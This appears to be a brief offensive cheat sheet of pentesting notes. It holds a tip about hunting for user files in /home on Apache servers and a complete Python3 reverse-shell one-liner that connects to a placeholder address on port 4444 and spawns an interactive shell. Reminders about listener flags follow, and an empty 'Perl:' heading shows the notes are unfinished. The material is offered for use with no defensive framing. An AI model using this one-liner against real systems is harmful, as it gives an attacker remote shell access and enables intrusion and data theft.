 * Apache Servers
    - Look for a /home directory and connect to it find the user's files 

Python3:
    python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IPADDRESSHERE",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

    - Remember to use the installed version of python.
    - Use the flags -lv or -lvu depending on if is it tcp or udp.
    - Remember to use BOTH IP and PORT 

Perl:
    
